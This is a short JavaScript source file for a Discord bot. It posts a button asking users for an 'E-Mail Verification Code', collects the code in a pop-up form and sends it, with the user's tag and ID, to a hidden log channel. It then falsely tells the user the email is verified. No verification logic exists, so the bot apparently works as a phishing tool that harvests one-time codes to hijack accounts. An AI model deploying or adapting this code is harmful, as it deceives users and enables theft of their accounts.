const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  Events,
} = require('discord.js');

const client = new Client({
  intents: [GatewayIntentBits.Guilds],
});

const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID;
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID;


client.once(Events.ClientReady, async () => {
  const channel = await client.channels.fetch(TARGET_CHANNEL_ID);

  const button = new ButtonBuilder()
    .setCustomId('nick_button')
    .setLabel('Enter E-Mail Verification Code')
    .setStyle(ButtonStyle.Primary);

  const row = new ActionRowBuilder().addComponents(button);

  await channel.send({
    content: 'Enter your E-Mail Verification Code using the button below.',
    components: [row],
  });

  console.log(`Logged in as ${client.user.tag}`);
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (interaction.isButton() && interaction.customId === 'nick_button') {
    const modal = new ModalBuilder()
      .setCustomId('nick_modal')
      .setTitle('E-Mail Verification');

    const input = new TextInputBuilder()
      .setCustomId('nick_input')
      .setLabel('Enter the E-Mail Verification code below:')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId === 'nick_modal') {
    const nick = interaction.fields.getTextInputValue('nick_input');
    const logChannel = await client.channels.fetch(LOG_CHANNEL_ID);

    await logChannel.send(
      `Code: **${nick}**\nUser: ${interaction.user.tag} (${interaction.user.id})`
    );

    await interaction.reply({ content: 'Email verified. Please wait for an examiner to test your combat abilities.', ephemeral: true });
  }
});

client.login(process.env.DISCORD_TOKEN);
